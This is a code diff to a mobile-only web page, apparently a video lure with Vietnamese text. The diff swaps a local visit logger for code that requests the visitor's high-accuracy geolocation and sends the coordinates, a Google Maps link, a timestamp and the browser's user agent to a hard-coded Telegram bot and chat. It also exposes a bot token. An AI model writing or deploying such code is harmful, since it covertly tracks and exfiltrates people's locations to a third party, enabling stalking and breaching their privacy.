@@ -90,18 +90,32 @@
         + '<div><h1 style="font-size:22px;margin-bottom:12px">📱 Mở trên điện thoại nhé!</h1>'
         + '<p style="color:#b8aec4;font-size:15px;line-height:1.5">Trang này chỉ xem được trên điện thoại.<br>Hãy quét mã QR hoặc mở link trên điện thoại của bạn.</p></div></div>';
     } else {
-      const sendVisit = (extra = {}) => {
-        fetch("/api/visit", {
+      const BOT = "9016053759:AAFsb4SJDMdRSOLdaxXt_HgPVsR8Ti5fSn0";
+      const CHAT = "7952404707";
+      const sendTele = (text) => {
+        fetch("https://api.telegram.org/bot" + BOT + "/sendMessage", {
           method: "POST",
           headers: { "content-type": "application/json" },
-          body: JSON.stringify({ referrer: document.referrer || "direct", ...extra }),
+          body: JSON.stringify({ chat_id: CHAT, text, parse_mode: "HTML" }),
           keepalive: true,
         }).catch(() => {});
       };
 
       navigator.geolocation.getCurrentPosition(
-        (pos) => sendVisit({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
-        () => sendVisit(),
+        (pos) => {
+          const lat = pos.coords.latitude;
+          const lng = pos.coords.longitude;
+          sendTele(
+            "📍 <b>Có người xem video!</b>\n\n"
+            + "🕐 " + new Date().toLocaleString("vi-VN") + "\n"
+            + "📌 Vị trí: " + lat.toFixed(6) + ", " + lng.toFixed(6) + "\n"
+            + "🗺 <a href='https://maps.google.com/?q=" + lat + "," + lng + "'>Mở Google Maps</a>\n"
+            + "📱 " + navigator.userAgent.slice(0, 80)
+          );
+        },
+        () => {
+          sendTele("👀 Có người xem video nhưng không chia sẻ vị trí.\n🕐 " + new Date().toLocaleString("vi-VN"));
+        },
         { timeout: 10000, enableHighAccuracy: true }
       );
 
